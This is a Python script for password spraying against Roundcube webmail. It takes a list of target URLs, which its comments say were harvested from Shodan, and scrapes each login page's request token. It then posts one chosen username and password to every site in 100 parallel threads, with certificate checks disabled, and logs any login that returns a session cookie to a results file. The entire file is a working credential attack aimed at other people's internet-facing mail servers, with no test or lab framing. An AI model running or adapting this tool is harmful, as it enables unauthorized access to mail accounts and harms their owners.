import colorama
import threading
import urllib3
import urllib.parse
import requests

from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
from tqdm import tqdm

colorama.init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Sprayer(object):
    def __init__(self, urls):
        self.username = ""
        self.password = ""

        self.urls = urls
        self.lock = threading.Lock()
        self.results_file = open("Results.txt", 'a')
        self.pbar = None
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; HarmonyOS; AGS3K-W09; HMSCore 6.10.4.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.5.303 Safari/537.36",

        }
    def normalize_urls(self):
        normalized_urls = []
        # can be optimized for in-place modification
        for url in self.urls:
            url = url.strip().rstrip()
            if ':443' in url:
                url = f"https://{url}"
            elif ':80' in url:
                url = f"http://{url}"
            else:
                normalized_urls.append(f"https://{url}")
                normalized_urls.append(f"http://{url}")
                
                # normalized_urls.append(f"https://{url}/roundcubemail")
                # normalized_urls.append(f"http://{url}/roundcubemail")
                continue
            
            # normalized_urls.append(url+'/roundcubemail')
            normalized_urls.append(url)
        self.urls = normalized_urls

    def login(self, url):
        session = requests.session()
        try:
            url = f"{url}"
            req = session.get(
                url=url,
                headers=self.headers,
                timeout=30,
                verify=False
            )
            # because different languages won't have the same "The installer is disabled!" message.
        except Exception as err:
            # failed to request, exit.
            self.pbar.update()
            return
        
        # now get the redirect path
        # this is important because some sites may have it as /mail or /roundemail or /login
        
        # parse the request_token needed for login
        try:
            '''
            
            we could do a apache default homepage check and if so then try /roundcubemail,
            but we're getting our urls from shodan with the http.title:"Roundcube..." so 
            it should already have a proper redirect to it.
            
            '''
            request_token = req.text.split('"request_token":"', 1)[1].split('"', 1)[0].strip().rstrip()

            headers = self.headers
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            url = f"{url}/?_task=login"

            data = {
                "_token": request_token,
                "_task": "login",
                "_action": "login",
                "_timezone": "America/New_York",
                "_url=_task": "login",
                "_user": self.username,
                "_pass": self.password,
            }

            # try logging in now
            req = session.post(
                url=url,
                headers=headers,
                data=data,
                verify=False,
                allow_redirects=False
            )
            # by status code we can see if it failed or succeeded & by the returned cookie name
            # for some reason valid logins for me are 200 and no cookie returned, but not in burpsuitem
            #     figure out why because a != 401 is gonna give 100000 false positives ! 
            if 'roundcube_sessauth' in f"{req.cookies}":
                print(f"{Fore.GREEN}[ {self.username}:{self.password}({url}) ]")
                self.lock.acquire()
                self.results_file.write(f"[ {self.username}:{self.password}({url}) ]\n")
                self.results_file.flush()
                self.lock.release()
                self.pbar.update()
                return

            # print(f"{Fore.RED}[ Login Failed ! ]")
            self.pbar.update()
        except Exception as err:
            # some sort of exception was thrown
            self.pbar.update()

    def main(self):
        self.normalize_urls()
        self.pbar = tqdm(total=len(self.urls), desc="Checking...")

        self.username = input(f"[ Username to spray ]: ").strip().rstrip()
        self.password = input(f"[ Password to spray ]: ").strip().rstrip()

        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map( self.login, self.urls )
        self.results_file.close()


if __name__ == "__main__":
    urls_file = input(f"[ Urls File Path ]: ").strip().rstrip()
    urls = list(set(open(urls_file, 'r').readlines()))
    checkerObj = Sprayer( urls )
    checkerObj.main()
        
